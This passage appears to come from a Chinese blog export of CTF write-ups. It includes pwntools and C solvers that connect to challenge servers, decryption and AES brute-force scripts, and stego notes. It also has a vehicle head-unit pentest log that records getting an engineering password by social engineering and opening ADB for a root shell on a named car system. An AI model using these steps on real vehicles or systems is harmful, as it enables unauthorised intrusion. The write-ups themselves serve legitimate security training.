class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs markdown">from pwn import *<br>import re<br><br>def solve<span class="hljs-emphasis">_and_</span>wait():<br><span class="hljs-code">    # 建立连接</span><br><span class="hljs-code">    p = remote(&quot;124.221.156.93&quot;, 32946)</span><br><span class="hljs-code">    </span><br><span class="hljs-code">    try:</span><br><span class="hljs-code">        # 阶段1：初始化挑战</span><br><span class="hljs-code">        print(&quot;[+] Receiving welcome message...&quot;)</span><br><span class="hljs-code">        welcome_msg = p.recvuntil(b&quot;press the Enter key to start our challenge.&quot;, timeout=10)</span><br><span class="hljs-code">        p.sendline(b&#x27;&#x27;)  # 发送回车开始</span><br><span class="hljs-code">        </span><br><span class="hljs-code">        # 阶段2：处理单次计算</span><br><span class="hljs-code">        print(&quot;\n[+] Receiving math challenge...&quot;)</span><br><span class="hljs-code">        question = p.recvuntil(b&#x27;= &#x27;, timeout=10).decode().strip()</span><br><span class="hljs-code">        print(f&quot;Math problem: &#123;question&#125;&quot;)</span><br><span class="hljs-code">        </span><br><span class="hljs-code">        # 计算答案</span><br><span class="hljs-code">        expr = question.split(&#x27;=&#x27;)[0].strip()</span><br><span class="hljs-code">        expr = expr.replace(&#x27;×&#x27;, &#x27;*&#x27;).replace(&#x27;÷&#x27;, &#x27;/&#x27;)</span><br><span class="hljs-code">        try:</span><br><span class="hljs-code">            answer = str(int(eval(expr)))</span><br><span class="hljs-code">        except:</span><br><span class="hljs-code">            answer = &quot;0&quot;</span><br><span class="hljs-code">        </span><br><span class="hljs-code">        p.sendline(answer.encode())</span><br><span class="hljs-code">        print(f&quot;Sent answer: &#123;answer&#125;&quot;)</span><br><span class="hljs-code">        </span><br><span class="hljs-code">        # 接收即时响应</span><br><span class="hljs-code">        response = p.recvline(timeout=5).decode().strip()</span><br><span class="hljs-code">        print(f&quot;Server reply: &#123;response&#125;&quot;)</span><br><span class="hljs-code">        </span><br><span class="hljs-code">        # 阶段3：保持连接开放</span><br><span class="hljs-code">        print(&quot;\n[+] Connection kept alive for manual interaction&quot;)</span><br><span class="hljs-code">        print(&quot;Available commands:&quot;)</span><br><span class="hljs-code">        print(&quot;  p.interactive()  - 启动交互式shell&quot;)</span><br><span class="hljs-code">        print(&quot;  p.recv(n)        - 接收n字节数据&quot;)</span><br><span class="hljs-code">        print(&quot;  p.send(data)     - 发送原始数据&quot;)</span><br><span class="hljs-code">        print(&quot;  p.close()        - 关闭连接&quot;)</span><br><span class="hljs-code">        </span><br><span class="hljs-code">        # 进入交互模式</span><br><span class="hljs-code">        p.interactive()</span><br><span class="hljs-code">        </span><br><span class="hljs-code">    except Exception as e:</span><br><span class="hljs-code">        print(f&quot;\n[!] Error: &#123;str(e)&#125;&quot;)</span><br><span class="hljs-code">    finally:</span><br><span class="hljs-code">        if not p.closed:</span><br><span class="hljs-code">            print(&quot;\n[!] Connection left open, remember to close it!&quot;)</span><br><span class="hljs-code">            # 注意：这里故意不自动关闭连接</span><br><span class="hljs-code"></span><br>if <span class="hljs-strong">__name__</span> == &quot;<span class="hljs-strong">__main__</span>&quot;:<br><span class="hljs-code">    solve_and_wait()</span><br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs plain">#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;time.h&gt;<br><br>int main() &#123;<br>    time_t seed = time(0LL);<br>    srand(seed);<br><br>    int v3 = rand() % 10000 + 1;<br>    int v2 = rand() % 10000 + 1;<br>    // 打印题目（可选）<br>    printf(&quot;%d * %d = %d\n&quot;, v3, v2,v3*v2);<br><br>    // 构造要发送的命令字符串<br>    char cmd[128];<br>    snprintf(cmd, sizeof(cmd), &quot;nc 124.221.156.93 32914\n%d&quot;, v3*v2);<br><br>    // 执行命令<br>    system(cmd);<br><br>    return 0;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p><img src="/./img/g_5G5hK2cxX3dqC2/1746936458555-6df028f5-6917-46da-9c47-bf8244e07419-913461.png" alt="1746936458555-6df028f5-6917-46da-9c47-bf8244e07419.png">flag{598a2e38-cdfa-4b96-a80f-97077df12f3b}</p><h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><p><img src="/./img/g_5G5hK2cxX3dqC2/1746939179739-ba3933a5-9b70-444a-8f8e-70469afd3454-815612.png" alt="1746939179739-ba3933a5-9b70-444a-8f8e-70469afd3454.png"></p><p><img src="/./img/g_5G5hK2cxX3dqC2/1746938913447-a5c9b597-0e58-4095-86f1-64bf28be0f9b-952478.png" alt="1746938913447-a5c9b597-0e58-4095-86f1-64bf28be0f9b.png"></p><ol><li><strong>目标值</strong>：<code>**-2147483645**</code>（十进制）</li><li><strong>对应正数溢出值</strong>：<ul><li><code>**int**</code> 范围为 <code>**-2147483648**</code> 到 <code>**2147483647**</code>。</li><li>溢出计算：<code>**目标值 = 目标正数 - 2^32**</code>。</li><li>解得：<code>**目标正数 = 目标值 + 2^32 = -2147483645 + 4294967296 = 2147483651**</code>。</li></ul></li><li><strong>输入字符串</strong>：<code>**2147483651**</code>（不以负号开头）。</li></ol><blockquote><p>更新: 2025-06-04 14:38:09<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/beb02ytfa81ml8fk">https://www.yuque.com/chaye-apqbl/vsc85q/beb02ytfa81ml8fk</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/WP/2025/%E6%8B%9B%E5%95%86%E8%BD%A6%E8%BE%86%E6%B5%8B%E8%AF%95-Polis/"/>
    <url>/2026/01/19/WP/2025/%E6%8B%9B%E5%95%86%E8%BD%A6%E8%BE%86%E6%B5%8B%E8%AF%95-Polis/</url>
    
    <content type="html"><![CDATA[<h1 id="招商车辆测试-Polis"><a href="#招商车辆测试-Polis" class="headerlink" title="招商车辆测试-Polis"></a>招商车辆测试-Polis</h1><h1 id="day1—–8号车-岚图（鸿蒙）-不能碰"><a href="#day1—–8号车-岚图（鸿蒙）-不能碰" class="headerlink" title="day1—–8号车 岚图（鸿蒙） 不能碰"></a>day1—–8号车 岚图（鸿蒙） 不能碰</h1><h1 id="day2—–1号车-极氪-不能碰"><a href="#day2—–1号车-极氪-不能碰" class="headerlink" title="day2—–1号车 极氪  不能碰"></a>day2—–1号车 极氪  不能碰</h1><h2 id="wifi测试"><a href="#wifi测试" class="headerlink" title="wifi测试"></a>wifi测试</h2><p>连接流量抓包后 过滤车机分配给我们的ip地址</p><p>!(ip.addr&#x3D;&#x3D;192.168.225.184 or ip.addr&#x3D;&#x3D;192.168.25.2 or ip.addr&#x3D;&#x3D;192.168.225.40 or ip.addr&#x3D;&#x3D;192.168.225.50) </p><p><img src="/./img/MBB_LnB7-NiGv3Pn/1757037148644-4569794b-c5b3-47b6-b14a-5dfed866e50a-954840.png" alt="1757037148644-4569794b-c5b3-47b6-b14a-5dfed866e50a.png"></p><p>下一步找到车机ip 192.168.225.1</p><p><img src="/./img/MBB_LnB7-NiGv3Pn/1757038076021-e10e5746-c96d-4e7b-990f-e0a0c41d7655-319644.png" alt="1757038076021-e10e5746-c96d-4e7b-990f-e0a0c41d7655.png"></p><p>扫描端口 要检测存活端口 </p><h1 id="day3—–4号车-五菱星光（宝骏车机）"><a href="#day3—–4号车-五菱星光（宝骏车机）" class="headerlink" title="day3—–4号车 五菱星光（宝骏车机）"></a>day3—–4号车 五菱星光（宝骏车机）</h1><p>1.28 复制打开抖音，看看【星光汽车-一缕星光✨的作品】五菱星光&#x2F;星光S&#x2F;2025款最新车机系统进入工程师… <a href="https://v.douyin.com/2KIAon0ioUs/">https://v.douyin.com/2KIAon0ioUs/</a> 02&#x2F;27 eBg:&#x2F; <a href="mailto:&#x46;&#x40;&#117;&#46;&#x53;&#x59;">F@u.SY</a> </p><p>加密流程跟车机软件版本和时间有关，属于每日生成：</p><p>车机软件版本：Q2000061QLC0141083</p><p>社工后输入密码：Q200002931  进入工程模式</p><p>ip：172.20.10.2:5555</p><p>可以打开wifi adb和adb</p><p>输入adb shell</p><p>连接进去就是root权限</p><p>修复意见：</p><ul><li>immediate action**: <strong>断网 -&gt; 恢复出厂设置</strong>。</li><li><strong>根本性防御</strong>： <strong>提升人员的安全意识</strong>，杜绝通过社工手段泄露机密信息（如工程密码）。没有这个前提，所有的技术防御都可能被绕过。</li><li><strong>技术加固</strong>： <strong>严格管控高权限接口</strong>（如ADB、工程模式），实施网络隔离和系统监控。</li></ul><p>扫描内网</p><p><img src="/./img/MBB_LnB7-NiGv3Pn/1757149937834-4f634f44-dd57-4c8b-9d57-f8944d16c7c2-232767.png" alt="1757149937834-4f634f44-dd57-4c8b-9d57-f8944d16c7c2.png">  </p><blockquote><p>更新: 2025-09-06 17:17:12<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/lxd77zfo1lgiee7y">https://www.yuque.com/chaye-apqbl/vsc85q/lxd77zfo1lgiee7y</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/WP/2025/l3hCTF/"/>
    <url>/2026/01/19/WP/2025/l3hCTF/</url>
    
    <content type="html"><![CDATA[<h1 id="l3hCTF"><a href="#l3hCTF" class="headerlink" title="l3hCTF"></a>l3hCTF</h1><blockquote><p>更新: 2025-07-12 13:54:28<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/pert3g242vp63gki">https://www.yuque.com/chaye-apqbl/vsc85q/pert3g242vp63gki</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/WP/2025/jlctf/"/>
    <url>/2026/01/19/WP/2025/jlctf/</url>
    
    <content type="html"><![CDATA[<h1 id="jlctf"><a href="#jlctf" class="headerlink" title="jlctf"></a>jlctf</h1><h1 id="热身赛"><a href="#热身赛" class="headerlink" title="热身赛"></a>热身赛</h1><h2 id="re2"><a href="#re2" class="headerlink" title="re2"></a>re2</h2><p><img src="/./img/5xtBq5kMGKE2OZjN/1745376542558-f0a55de5-200a-4991-b3da-8737aec2b777-507304.png" alt="1745376542558-f0a55de5-200a-4991-b3da-8737aec2b777.png"></p><p><img src="/./img/5xtBq5kMGKE2OZjN/1745376532862-6c11e3ef-6d9f-459a-ab70-3a75798b5699-020801.png" alt="1745376532862-6c11e3ef-6d9f-459a-ab70-3a75798b5699.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs plain">import numpy as np<br><br># 定义 xmmword_1400032F8 和 xmmword_1400032E8<br>xmmword_1400032F8 = np.array([0x0F, 0x0E, 0x0D, 0x0C, 0x0B, 0x0A, 0x09, 0x08, 0x07, 0x06, 0x05, 0x04, 0x03, 0x02, 0x01, 0x00], dtype=np.uint8)<br>xmmword_1400032E8 = np.array([0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10], dtype=np.uint8)<br><br># 定义加密后的字符串<br>encrypted = &quot;cge87k?9&lt;&gt;?@=pss393=&gt;;8@:Cp@DAuH&quot;<br><br># 将加密后的字符串转换为字节数组<br>encrypted_bytes = np.frombuffer(encrypted.encode(), dtype=np.uint8)<br><br># 初始化空的解密结果<br>decrypted = bytearray()<br><br># 进行解密操作<br>for i in range(0, len(encrypted_bytes), 16):<br>    block = encrypted_bytes[i:i+16]<br>    # 逆向 _mm_add_epi8<br>    block = np.subtract(block, xmmword_1400032E8, dtype=np.uint8)<br>    # 逆向 _mm_shuffle_epi8<br>    inverse_shuffle = np.argsort(xmmword_1400032F8)<br>    block = block[inverse_shuffle]<br>    decrypted.extend(block)<br><br># 将解密结果转换为字符串<br>flag = decrypted.decode()<br><br>print(f&quot;Flag: flag&#123;&#123;&#123;flag&#125;&#125;&#125;&quot;)<br></code></pre></td></tr></table></figure><blockquote><p>更新: 2025-04-23 10:50:17<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/unksirzaog0qx54y">https://www.yuque.com/chaye-apqbl/vsc85q/unksirzaog0qx54y</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/WP/2025/jiya%E7%9A%84%E8%80%83%E9%AA%8C/"/>
    <url>/2026/01/19/WP/2025/jiya%E7%9A%84%E8%80%83%E9%AA%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="jiya的考验"><a href="#jiya的考验" class="headerlink" title="jiya的考验"></a>jiya的考验</h1><h2 id="交响曲"><a href="#交响曲" class="headerlink" title="交响曲"></a>交响曲</h2><p><img src="/./img/2rNqSH7-PgWN4Nxc/1742621313513-bdd018d2-e265-484c-9fb5-56f29ed37b65-931123.png" alt="1742621313513-bdd018d2-e265-484c-9fb5-56f29ed37b65.png"></p><p><img src="/./img/2rNqSH7-PgWN4Nxc/1742621306454-6d85446d-f931-4850-a0a8-f5efba9206ed-156724.png" alt="1742621306454-6d85446d-f931-4850-a0a8-f5efba9206ed.png"></p><h3 id="flag01"><a href="#flag01" class="headerlink" title="flag01"></a>flag01</h3><p><img src="/./img/2rNqSH7-PgWN4Nxc/1742622417243-b0564247-cecb-47aa-80ab-b7119ddc2919-977004.png" alt="1742622417243-b0564247-cecb-47aa-80ab-b7119ddc2919.png"></p><p><img src="/./img/2rNqSH7-PgWN4Nxc/1742622398257-56285564-e44c-4a81-842a-f2982eaf3851-607586.png" alt="1742622398257-56285564-e44c-4a81-842a-f2982eaf3851.png"></p><p><img src="/./img/2rNqSH7-PgWN4Nxc/1742623217508-2733aff7-cff3-44f3-99f2-b9a7675faa64-791156.png" alt="1742623217508-2733aff7-cff3-44f3-99f2-b9a7675faa64.png"></p><p>里面隐写提取出zlib好像走不通</p><p><img src="/./img/2rNqSH7-PgWN4Nxc/1742701737162-f29abdf2-c22c-452c-93c5-cab87ee5d2dc-220217.png" alt="1742701737162-f29abdf2-c22c-452c-93c5-cab87ee5d2dc.png"></p><p>黑白照片转二进制</p><p><img src="/./img/2rNqSH7-PgWN4Nxc/1742700847185-689593d6-5420-43be-9ff0-25cdc47d22bf-873437.png" alt="1742700847185-689593d6-5420-43be-9ff0-25cdc47d22bf.png"></p><blockquote><p>HINT:BV1wW4y1R7Jv&amp;&amp;FLAG1:@i_n1a_l0v3S_</p></blockquote><h3 id="flag02"><a href="#flag02" class="headerlink" title="flag02"></a>flag02</h3><p><img src="/./img/2rNqSH7-PgWN4Nxc/1742622434704-03bb6240-1f8b-4a4a-98fb-ffc2e7d7a25b-924726.png" alt="1742622434704-03bb6240-1f8b-4a4a-98fb-ffc2e7d7a25b.png"></p><p><img src="/./img/2rNqSH7-PgWN4Nxc/1742699524044-81c85950-c07e-41e6-9423-9959809fe011-106389.png" alt="1742699524044-81c85950-c07e-41e6-9423-9959809fe011.png"></p><p>导出字节流</p><p><img src="/./img/2rNqSH7-PgWN4Nxc/1742701107654-bcfe12d8-b91f-4b42-8ff4-9d4b09666733-055949.png" alt="1742701107654-bcfe12d8-b91f-4b42-8ff4-9d4b09666733.png"></p><p><img src="/./img/2rNqSH7-PgWN4Nxc/1742703660122-150d581e-a493-4771-812b-24665f3670b3-852182.png" alt="1742703660122-150d581e-a493-4771-812b-24665f3670b3.png"></p><p><img src="/./img/2rNqSH7-PgWN4Nxc/1742703690249-743f87f9-3fcc-4109-8237-4f8d11d57f98-167234.png" alt="1742703690249-743f87f9-3fcc-4109-8237-4f8d11d57f98.png"></p><p>HINT:BV1wW4y1R7Jv&amp;&amp;FLAG1:@i_n1a_l0v3S_</p><p>BV1wW4y1R7Jv bv编码</p><p><a href="https://www.bilibili.com/video/BV1wW4y1R7Jv/?vd_source=076e1e9de2e61963283715e603d3511c">https://www.bilibili.com/video/BV1wW4y1R7Jv/?vd_source&#x3D;076e1e9de2e61963283715e603d3511c</a></p><p>00:03</p><p>‬‌‍‬‌00:00‍‬‌‬‬‌‍</p><p>00‍‬‌‬:21</p><p>00:03‍‍‌‬‌‌‌</p><p>00:00</p><p>00:‌‌‌‌‍‌‬‌21</p><p>‌‌‌‌‍‌‬‍00:09‌‌‌‌‍‌‬‌‌‌‌‍‍‍‌‌‌‌‌‌‬‍‌‌‬‬‌</p><p>00‍‍‌‍‍‌‬‌:00</p><p>‍‍‌‬‬00:12</p><p>‍‍‌‌‬‌‌‌‌‍‬‍‬00:08</p><p>00‌‌‌‌‍‬‌‌‌‌‌‍‬‌‍‌‌‌‌‍‬‍:00‌‌‌‌‌‌‍</p><p>00:20‌‌‌‍</p><p>BANBANFAHFAM</p><p>根据提示要+1秒</p><p>CAOCAOGAIFAN</p><p>flag{@i_n1a_l0v3S_CAOCAOGAIFAN}</p><blockquote><p>更新: 2025-03-23 12:27:38<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/kkwb18y431bcom9x">https://www.yuque.com/chaye-apqbl/vsc85q/kkwb18y431bcom9x</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/WP/2025/index/"/>
    <url>/2026/01/19/WP/2025/index/</url>
    
    <content type="html"><![CDATA[<h1 id="2025"><a href="#2025" class="headerlink" title="2025"></a>2025</h1><blockquote><p>更新: 2025-03-03 12:45:37<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/caeiiolu4l120mvd">https://www.yuque.com/chaye-apqbl/vsc85q/caeiiolu4l120mvd</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/WP/2024/%E7%BD%91%E9%BC%8E%E6%9D%AF10.29%E5%89%8D/"/>
    <url>/2026/01/19/WP/2024/%E7%BD%91%E9%BC%8E%E6%9D%AF10.29%E5%89%8D/</url>
    
    <content type="html"><![CDATA[<h1 id="网鼎杯10-29前"><a href="#网鼎杯10-29前" class="headerlink" title="网鼎杯10.29前"></a>网鼎杯10.29前</h1><blockquote><p>更新: 2024-10-29 09:55:23<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/iyociumgclzxhg8i">https://www.yuque.com/chaye-apqbl/vsc85q/iyociumgclzxhg8i</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/WP/2024/%E7%9C%81%E8%B5%9B%E5%88%9D%E8%B5%9B%E5%A4%8D%E7%8E%B0/"/>
    <url>/2026/01/19/WP/2024/%E7%9C%81%E8%B5%9B%E5%88%9D%E8%B5%9B%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="省赛初赛复现"><a href="#省赛初赛复现" class="headerlink" title="省赛初赛复现"></a>省赛初赛复现</h1><h1 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h1><h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p>6L&lt;Ak3,<em>@VM*&gt;7U&amp;FZFNWc,Ib&#x3D;t,X!+,BnSDfoaNhdiO</em>][5F];eV^]Lm&amp;?$’&lt;oeGH&amp;6tqcgK_JDp-3;8wh?Si,G$BarTFjE?b$eR&#x2F;,Igij&lt;({u90M$5If589[&lt;4+jp%3_%R(526#1J|m5p&amp;H+%.#d0&lt;DmLK*#-\8w:xD2Y[3jO{l8[)&lt;(F[&#x3D;Bcixb&gt;Jp^%L2XvVTzW@9OTko&#x2F;P74d1sFscEbMO7Vhp&HM;+ww&#x2F;v[KM1%2M*7O}rEZM.LM0’\iwK:])pg-nJef\Rt4</p><p>python basecrack.py -m</p><p><img src="/./img/ZPkoScNW25Fe7b5u/1731042867183-218b4117-93fe-47a7-88db-acdae238ae68-658231.png" alt="1731042867183-218b4117-93fe-47a7-88db-acdae238ae68.png"></p><p><img src="/./img/ZPkoScNW25Fe7b5u/1731042880824-3eb87431-9f0a-4ad3-8189-9782cdee99fc-546656.png" alt="1731042880824-3eb87431-9f0a-4ad3-8189-9782cdee99fc.png"></p><p><img src="/./img/ZPkoScNW25Fe7b5u/1731042895521-fa6f7bab-e9cc-4c36-ac74-697f432b4fb2-628359.png" alt="1731042895521-fa6f7bab-e9cc-4c36-ac74-697f432b4fb2.png"></p><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><p>sign</p><p><img src="/./img/ZPkoScNW25Fe7b5u/1731396108064-77ec77c7-b616-4853-aa93-e0eed1d34ca7-918598.png" alt="1731396108064-77ec77c7-b616-4853-aa93-e0eed1d34ca7.png"></p><p>[81, 3, 86, 84, 87, 7, 81, 2, 2, 82, 95, 3, 82, 4, 2, 86, 94, 85, 81, 3, 84, 84, 87, 84, 95, 80, 94, 84, 83, 83, 87, 4]</p><p><font style="color:#bcbec4;background-color:#1e1f22;">w53Cj3HDgzTCsSM5wrg6FMKcw58Qw7RZSFLCljRxwrxbwrVdw4AEwqMjw7&#x2F;DkMKTw4&#x2F;Cv8Onw4NGw7jDmSdcwq4GGg&#x3D;&#x3D;</font></p><blockquote><p>更新: 2024-11-12 15:23:21<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/zitafltbhyckymom">https://www.yuque.com/chaye-apqbl/vsc85q/zitafltbhyckymom</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/WP/2024/%E7%9C%81%E8%B5%9B/"/>
    <url>/2026/01/19/WP/2024/%E7%9C%81%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="省赛"><a href="#省赛" class="headerlink" title="省赛"></a>省赛</h1><h1 id="测试赛"><a href="#测试赛" class="headerlink" title="测试赛"></a>测试赛<img src="/./img/IxJYJFuNVwiKo-kN/1730267714207-63b7ff52-313a-4801-97e5-8b57848f9372-750528.png" alt="1730267714207-63b7ff52-313a-4801-97e5-8b57848f9372.png"></h1><h2 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs plain">import base64<br>from Crypto.Cipher import AES<br><br><br>def aes_decrypt(data, key):<br>    key = key.encode(&#x27;utf-8&#x27;) + b&#x27;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;<br>    print(key)<br>    cipher = AES.new(key, AES.MODE_ECB)<br>    decrypted = cipher.decrypt(base64.b64decode(data))<br>    return decrypted<br><br><br>if __name__ == &quot;__main__&quot;:<br>    data = &#x27;Kln/qZwlOsux+b/Gv0WsxkOec5E70dNhvczSLFs+0pkHaovEOBqUApBGBDBUrH08&#x27;<br>    for i in range(100000, 999999):<br>        key = str(i)<br>        res = aes_decrypt(data=data, key=key)<br>        res = str(res)<br>        if &#x27;flag&#x27; in res or &#x27;DASCTF&#x27; in res:<br>            print(f&quot;key:&#123;key&#125;&quot;)<br>            print(f&quot;falg:&#123;res&#125;&quot;)<br>            break<br></code></pre></td></tr></table></figure><blockquote><p>更新: 2024-11-02 11:18:41<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/gmsb4s5ixu9u0tgq">https://www.yuque.com/chaye-apqbl/vsc85q/gmsb4s5ixu9u0tgq</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/WP/2024/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-Alkiad/"/>
    <url>/2026/01/19/WP/2024/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-Alkiad/</url>
    
    <content type="html"><![CDATA[<h1 id="极客大挑战-Alkiad"><a href="#极客大挑战-Alkiad" class="headerlink" title="极客大挑战-Alkiad"></a>极客大挑战-Alkiad</h1><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="ez-jpg"><a href="#ez-jpg" class="headerlink" title="ez_jpg"></a>ez_jpg</h2><p>base64后是jpg倒序</p><p><img src="/./img/YEfpTToMQZ5k9tAh/1731405597513-b0562b8c-75a6-4dc3-9e64-506ace91f838-362480.png" alt="1731405597513-b0562b8c-75a6-4dc3-9e64-506ace91f838.png"></p><p><img src="/./img/YEfpTToMQZ5k9tAh/1731405768862-d7d620cb-c2c8-485c-b762-abb6fed0fac0-616499.png" alt="1731405768862-d7d620cb-c2c8-485c-b762-abb6fed0fac0.png"></p><p><img src="/./img/YEfpTToMQZ5k9tAh/1731405870509-59ded869-74f5-49b4-a342-a55fc475c715-478029.jpeg" alt="1731405870509-59ded869-74f5-49b4-a342-a55fc475c715.jpeg"></p><p><img src="/./img/YEfpTToMQZ5k9tAh/1731463181603-5b0d133a-6b78-4d74-be22-551eff48115f-467699.png" alt="1731463181603-5b0d133a-6b78-4d74-be22-551eff48115f.png"></p><p>修改宽高</p><p><img src="/./img/YEfpTToMQZ5k9tAh/1731463215605-02bc854b-86fd-4dda-b740-3f8ff742d93d-247568.jpeg" alt="1731463215605-02bc854b-86fd-4dda-b740-3f8ff742d93d.jpeg"></p><p>SYC{Steg_4nd_Zip_1s_G00d!}</p><h2 id="雪"><a href="#雪" class="headerlink" title="雪"></a>雪</h2><p><img src="/./img/YEfpTToMQZ5k9tAh/1731463467042-0ac53ede-20af-472d-aa81-20914d392768-521835.png" alt="1731463467042-0ac53ede-20af-472d-aa81-20914d392768.png"></p><p>密码W3LC0M4，提取盲水印</p><p><img src="/./img/YEfpTToMQZ5k9tAh/1731463644066-24f535aa-efc5-4583-9365-5569e38612a0-316911.png" alt="1731463644066-24f535aa-efc5-4583-9365-5569e38612a0.png"></p><p>Th1si4st8eK3y</p><p><img src="/./img/YEfpTToMQZ5k9tAh/1731463790804-4c25bb2d-4466-486e-bad2-6a44e82a2ae4-751613.png" alt="1731463790804-4c25bb2d-4466-486e-bad2-6a44e82a2ae4.png"></p><h2 id="Truth-of-Word"><a href="#Truth-of-Word" class="headerlink" title="Truth of Word"></a>Truth of Word</h2><p><img src="/./img/YEfpTToMQZ5k9tAh/1731410476148-8eae410d-8848-48c2-a190-a768d5367cfb-701233.png" alt="1731410476148-8eae410d-8848-48c2-a190-a768d5367cfb.png"></p><p><img src="/./img/YEfpTToMQZ5k9tAh/1731411443807-2371710c-8eec-4f75-8026-dea175c0738b-287023.png" alt="1731411443807-2371710c-8eec-4f75-8026-dea175c0738b.png"></p><p><img src="/./img/YEfpTToMQZ5k9tAh/1731411723934-94909c70-bb57-4323-b1ed-079b4b031625-625756.png" alt="1731411723934-94909c70-bb57-4323-b1ed-079b4b031625.png"></p><p><img src="/./img/YEfpTToMQZ5k9tAh/1731411476488-d7793116-adc2-4c52-9ff9-a3781e367d7d-306101.png" alt="1731411476488-d7793116-adc2-4c52-9ff9-a3781e367d7d.png"></p><h2 id="cimbar"><a href="#cimbar" class="headerlink" title="cimbar"></a>cimbar</h2><p>对着图片敲二进制就行</p><p><img src="/./img/YEfpTToMQZ5k9tAh/1731741246905-615f38c7-dc35-4c36-9cc1-09740601b03f-258413.png" alt="1731741246905-615f38c7-dc35-4c36-9cc1-09740601b03f.png"></p><p>0101 0011 0101 1001 0100 0011 0111 1011</p><p>0100 0001 0110 1110 0011 0000 0111 0100</p><p>0110 1000 0011 0011 0111 0010 0101 1111</p><p>0100 0001 0110 1101 0100 0000 0111 1010</p><p>0011 0001 0110 1110 0011 1001 0101 1111</p><p>0101 0001 0101 0010 0101 1111 0100 0011</p><p>0110 1111 0011 0100 0110 0101 0111 1101</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 